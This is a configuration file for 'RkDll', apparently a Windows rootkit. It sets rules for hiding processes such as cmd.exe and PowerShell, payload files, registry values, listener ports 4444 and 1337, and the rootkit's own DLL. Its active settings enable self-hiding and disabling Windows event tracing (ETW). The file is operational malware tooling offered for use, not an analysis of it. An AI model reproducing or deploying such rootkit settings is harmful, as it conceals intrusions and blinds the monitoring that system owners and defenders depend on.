; rk.ini - RkDll configuration (hot-reloaded every 2 s by the watcher)
;
; Matching is case-insensitive wildcard: '*' = any run, '?' = any char.
; Lines starting with ';' or '#' are comments. Sections with no active
; entries disable that hiding surface entirely.
;
; The injector deploys a UTF-16LE copy next to RkDll.dll; this ASCII copy
; is also accepted (config.cpp widens it). An absolute override path can
; be set under HKLM\SOFTWARE\Rk\RkConfigPath.

[HideProcess]
;cmd.exe
;powershell*
;tool_*

[HideFile]
;payload*.exe
;secret.txt

[HideRegistry]
;InstallTime*
;TimeStamp

[HidePort]
;4444
;1337

[HideModule]
;RkDll.dll

[Advanced]
SelfHide=1
DisableEtw=1
HookInjector=1